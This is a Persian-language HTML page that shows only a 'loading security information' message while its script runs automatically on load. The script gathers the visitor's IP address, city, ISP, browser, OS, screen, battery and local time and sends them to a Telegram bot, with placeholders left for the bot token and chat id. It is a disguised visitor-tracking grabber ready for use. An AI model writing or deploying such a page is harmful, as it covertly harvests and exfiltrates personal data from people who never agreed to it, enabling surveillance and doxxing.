<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>در حال بارگیری...</title>
</head>
<body>
  <h3>در حال بارگیری اطلاعات امنیتی...</h3>

  <script>
    async function getInfoAndSend() {
      try {
        // IP و موقعیت
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());

        // باتری
        const battery = await navigator.getBattery?.();
        const batteryLevel = battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص";
        const charging = battery ? (battery.charging ? "بله" : "خیر") : "نامشخص";

        // زمان
        const now = new Date();
        const localTime = now.toLocaleString("fa-IR");
        const ipTime = new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "UTC" });

        // اطلاعات نهایی
        const info = {
          ip: ipData?.ip || "نامشخص",
          location: `${ipData?.city || "-"}, ${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
          org: ipData?.org || "نامشخص",
          os: navigator.platform || "نامشخص",
          browser: navigator.userAgent || "نامشخص",
          device: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "mobile" : "desktop",
          screen: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language || "نامشخص",
          battery: batteryLevel,
          charging: charging,
          local_time: localTime,
          ip_time: ipTime
        };

        // پیام
        const message = `[گزارش ورود جدید]\n
IP: ${info.ip}\n
\n
مکان: ${info.location}\n
\n
ارائه‌دهنده: ${info.org}\n
\n
سیستم‌عامل: ${info.os}\n
\n
مرورگر: ${info.browser}\n
\n
نوع دستگاه: ${info.device}\n
\n
رزولوشن صفحه: ${info.screen}\n
\n
زبان مرورگر: ${info.language}\n
\n
وضعیت باتری: ${info.battery} - شارژ: ${info.charging}\n
\n
زمان محلی: ${info.local_time}\n
\n
زمان منطقه‌ای: ${info.ip_time}`;

        // ارسال به تلگرام
        const token = "توکن_ربات_تو_اینجا";
        const chat_id = "آیدی_چت_تو_اینجا";
        const url = `https://api.telegram.org/bot${token}/sendMessage`;

        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id, text: message }),
        });
      } catch (err) {
        console.error("خطا در دریافت یا ارسال اطلاعات:", err);
      }
    }

    getInfoAndSend();
  </script>
</body>
</html>
